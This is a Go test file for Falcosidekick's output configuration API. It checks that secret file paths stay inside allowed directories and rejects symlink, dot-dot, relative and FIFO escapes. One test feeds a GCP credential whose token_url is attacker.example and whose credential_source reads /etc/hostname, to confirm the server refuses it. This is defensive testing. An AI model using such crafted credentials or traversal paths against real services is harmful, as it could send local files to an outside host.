// Copyright (C) 2026 The Falco Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package api

import (
	"encoding/json"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/falcosecurity/falcosidekick/internal/catalog"
	"github.com/falcosecurity/falcosidekick/internal/database"
	"github.com/falcosecurity/falcosidekick/internal/domain/output"
	"github.com/falcosecurity/falcosidekick/internal/outputs/gcppubsub"
	"github.com/falcosecurity/falcosidekick/internal/outputs/webhook"
	"github.com/falcosecurity/falcosidekick/internal/utils"
)

// A file path sent through the API can make Sidekick read a file and send it to a host the
// request chose, so every new path must resolve to a regular file inside api.secret_dirs.
func TestPUTFilePathsMustResolveInsideSecretDirs(t *testing.T) {
	secrets := t.TempDir()
	outside := t.TempDir()
	write := func(dir, name, content string) string {
		path := filepath.Join(dir, name)
		require.NoError(t, os.WriteFile(path, []byte(content), 0o600))
		return path
	}
	inside := write(secrets, "password", "file-password\n")
	stranger := write(outside, "password", "outside-private")
	escape := filepath.Join(secrets, "escape")
	require.NoError(t, os.Symlink(stranger, escape))
	fifo := filepath.Join(secrets, "fifo")
	require.NoError(t, syscall.Mkfifo(fifo, 0o600))
	large := write(secrets, "large", strings.Repeat("a", utils.MaxFileSize+1))
	traversal := filepath.Join(secrets, "..", filepath.Base(outside), "password")
	relative, err := filepath.Rel(mustGetwd(t), inside)
	require.NoError(t, err)

	cat, err := catalog.New([]output.Type{webhook.OutputType})
	require.NoError(t, err)
	host := `"host":"https://example.invalid","endpoint":"/events"`
	for _, tc := range []struct {
		name       string
		config     string
		want       string
		secretDirs []string
	}{
		{name: "no secret_dirs", config: `"password_file":"` + inside + `"`, want: "password_file: file paths sent through the API need api.secret_dirs"},
		{name: "inside", config: `"password_file":"` + inside + `"`, secretDirs: []string{outside, secrets}},
		{name: "outside", config: `"password_file":"` + stranger + `"`, secretDirs: []string{secrets}, want: "password_file: " + errFileOutsideDirs.Error()},
		{name: "symlink out", config: `"password_file":"` + escape + `"`, secretDirs: []string{secrets}, want: errFileOutsideDirs.Error()},
		{name: "dot-dot", config: `"password_file":"` + traversal + `"`, secretDirs: []string{secrets}, want: errFileOutsideDirs.Error()},
		{name: "relative", config: `"password_file":"` + relative + `"`, secretDirs: []string{secrets}, want: errFileOutsideDirs.Error()},
		{name: "missing", config: `"password_file":"` + filepath.Join(secrets, "missing") + `"`, secretDirs: []string{secrets}, want: errFileOutsideDirs.Error()},
		{name: "fifo", config: `"password_file":"` + fifo + `"`, secretDirs: []string{secrets}, want: errFileOutsideDirs.Error()},
		{name: "too large", config: `"password_file":"` + large + `"`, secretDirs: []string{secrets}, want: errFileOutsideDirs.Error()},
		{name: "header file", config: `"headers":{"X-Key":{"files":["` + inside + `","` + stranger + `"]}}`, secretDirs: []string{secrets}, want: `headers["X-Key"].files[1]: ` + errFileOutsideDirs.Error()},
		{name: "tls file", config: `"tls":{"ca_file":"` + stranger + `"}`, secretDirs: []string{secrets}, want: "tls.ca_file: " + errFileOutsideDirs.Error()},
		{name: "not a path", config: `"tls":{"ca_file":{"path":"x"}}`, secretDirs: []string{secrets}, want: "tls.ca_file: must be a file path"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			db := database.NewMemory()
			rig := buildMutationRig(t, db, cat, true)
			rig.Server.secretDirs = tc.secretDirs
			status := http.StatusOK
			if tc.want != "" {
				status = http.StatusBadRequest
			}
			raw := requestSecretContract(t, rig.Server, http.MethodPut, "/api/v1/pipeline/outputs/webhook",
				`{"version":0,"config":{`+host+`,`+tc.config+`}}`, status)
			assert.NotContains(t, string(raw), "outside-private")
			stored, err := db.GetOutputConfig(t.Context(), "webhook")
			require.NoError(t, err)
			if tc.want != "" {
				assert.Contains(t, responseError(t, raw), tc.want)
				assert.NotContains(t, string(raw), outside, "the refusal does not echo the path")
				assert.Nil(t, stored, "a refused PUT stores nothing")
				return
			}
			require.NotNil(t, stored)
			assert.Equal(t, inside, stored.Config["password_file"], "the store keeps the reference")
			assert.NotContains(t, stored.Config, "password", "the secret read from the file is never stored")
			var masked outputConfigResponse
			require.NoError(t, json.Unmarshal(raw, &masked))
			assert.True(t, masked.SecretFields["/password"], "a secret set through its file counts as configured")
		})
	}
}

func TestPUTFilePathsInListShapedMapsAreChecked(t *testing.T) {
	outside := filepath.Join(t.TempDir(), "token")
	require.NoError(t, os.WriteFile(outside, []byte("outside-private"), 0o600))
	cat, err := catalog.New([]output.Type{webhook.OutputType})
	require.NoError(t, err)
	for _, field := range []string{"headers", "query_params"} {
		t.Run(field, func(t *testing.T) {
			db := database.NewMemory()
			rig := buildMutationRig(t, db, cat, true)
			raw := requestSecretContract(t, rig.Server, http.MethodPut, "/api/v1/pipeline/outputs/webhook",
				`{"version":0,"config":{"host":"https://example.invalid","`+field+`":[{"X-Leak":{"files":["`+outside+`"]}}]}}`,
				http.StatusBadRequest)
			assert.NotContains(t, string(raw), "outside-private")
			stored, err := db.GetOutputConfig(t.Context(), "webhook")
			require.NoError(t, err)
			assert.Nil(t, stored)
		})
	}
}

// The decoder accepts a list for a map field; the API must read it the same way, or a path
// written in the list shape escapes the check.
func TestListShapeIsReadLikeTheDecoder(t *testing.T) {
	file := filepath.Join(t.TempDir(), "b")
	require.NoError(t, os.WriteFile(file, []byte("b"), 0o600))
	object := `{"host":"https://h","headers":{"X-A":{"values":["a"]},"X-B":{"FILES":["` + file + `"]}}}`
	list := `{"host":"https://h","headers":[{"X-A":{"values":["old"]}},[{"X-A":{"values":["a"]}}],null,{"X-B":{"FILES":["` + file + `"]}}]}`
	normalized := make([]map[string]any, 0, 2)
	for _, raw := range []string{object, list} {
		var cfg map[string]any
		require.NoError(t, json.Unmarshal([]byte(raw), &cfg))
		_, err := webhook.OutputType.New(utils.DeepCopyMap(cfg), output.Deps{})
		require.NoError(t, err, "the decoder accepts %s", raw)
		_, merged, err := mergeOutputConfigForSchema(nil, cfg, webhook.OutputType.Schema)
		require.NoError(t, err)
		paths := make(map[string]string)
		require.NoError(t, collectFilePaths(merged, webhook.OutputType.Schema.Fields, "", paths))
		assert.Equal(t, map[string]string{`headers["X-B"].files[0]`: file}, paths)
		normalized = append(normalized, merged)
	}
	assert.Equal(t, normalized[0], normalized[1], "both shapes become the same object")
}

// Paths already stored came from an output file or an earlier check; moving one elsewhere is new.
func TestPUTKeepsStoredFilePathsOnlyInPlace(t *testing.T) {
	outside := t.TempDir()
	headerFile := filepath.Join(outside, "token")
	require.NoError(t, os.WriteFile(headerFile, []byte("token"), 0o600))
	cat, err := catalog.New([]output.Type{webhook.OutputType})
	require.NoError(t, err)
	db := database.NewMemory()
	seedOutput(t, db, "webhook", map[string]any{
		"host": "https://example.invalid", "endpoint": "/events",
		"headers": map[string]any{"X-Key": map[string]any{"files": []any{headerFile}}},
	})
	rig := buildMutationRig(t, db, cat, true)
	rig.Server.secretDirs = []string{t.TempDir()}

	requestSecretContract(t, rig.Server, http.MethodPut, "/api/v1/pipeline/outputs/webhook",
		`{"version":1,"config":{"method":"PUT"}}`, http.StatusOK)

	raw := requestSecretContract(t, rig.Server, http.MethodPut, "/api/v1/pipeline/outputs/webhook",
		`{"version":2,"config":{"headers":{"X-Other":{"files":["`+headerFile+`"]}}}}`, http.StatusBadRequest)
	assert.Contains(t, responseError(t, raw), `headers["X-Other"].files[0]`)
}

func responseError(t *testing.T, raw []byte) string {
	t.Helper()
	var body struct {
		Error string `json:"error"`
	}
	require.NoError(t, json.Unmarshal(raw, &body))
	return body.Error
}

// A new <name>_file replaces the stored value of the secret, and a new value replaces a stored file.
func TestPUTSecretFileReplacesStoredValue(t *testing.T) {
	secrets := t.TempDir()
	file := filepath.Join(secrets, "password")
	require.NoError(t, os.WriteFile(file, []byte("from-file"), 0o600))
	cat, err := catalog.New([]output.Type{webhook.OutputType})
	require.NoError(t, err)
	db := database.NewMemory()
	seedOutput(t, db, "webhook", map[string]any{
		"host": "https://example.invalid", "endpoint": "/events", "password": "stored-value",
	})
	rig := buildMutationRig(t, db, cat, true)
	rig.Server.secretDirs = []string{secrets}

	requestSecretContract(t, rig.Server, http.MethodPut, "/api/v1/pipeline/outputs/webhook",
		`{"version":1,"config":{"password_file":"`+file+`"}}`, http.StatusOK)
	stored, err := db.GetOutputConfig(t.Context(), "webhook")
	require.NoError(t, err)
	assert.Equal(t, file, stored.Config["password_file"])
	assert.NotContains(t, stored.Config, "password", "the stored value gave way to the file")

	assert.Equal(t, map[string]any{"password": "new-value"}, mustMerge(t, map[string]any{"password_file": file}, `{"password":"new-value"}`))
	assert.Equal(t, map[string]any{"password_file": file}, mustMerge(t, map[string]any{"password": "old"}, `{"password_file":"`+file+`"}`))
}

// D9: an output type can refuse values only output files may hold.
func TestPUTRunsTheOutputAPIWriteCheck(t *testing.T) {
	cat, err := catalog.New([]output.Type{gcppubsub.OutputType})
	require.NoError(t, err)
	db := database.NewMemory()
	rig := buildMutationRig(t, db, cat, true)
	credentials, err := json.Marshal(`{"type":"external_account","token_url":"https://attacker.example","credential_source":{"file":"/etc/hostname"}}`)
	require.NoError(t, err)

	raw := requestSecretContract(t, rig.Server, http.MethodPut, "/api/v1/pipeline/outputs/gcppubsub",
		`{"version":0,"config":{"project_id":"p","topic":"t","credentials":`+string(credentials)+`}}`, http.StatusBadRequest)
	assert.Equal(t, "credentials: a credential_source is accepted only from output files or credentials_file", responseError(t, raw))
	stored, err := db.GetOutputConfig(t.Context(), "gcppubsub")
	require.NoError(t, err)
	assert.Nil(t, stored)
}

func mustMerge(t *testing.T, stored map[string]any, patch string) map[string]any {
	t.Helper()
	var update map[string]any
	require.NoError(t, json.Unmarshal([]byte(patch), &update))
	_, merged, err := mergeOutputConfigForSchema(stored, update, webhook.OutputType.Schema)
	require.NoError(t, err)
	return merged
}

func mustGetwd(t *testing.T) string {
	t.Helper()
	wd, err := os.Getwd()
	require.NoError(t, err)
	return wd
}
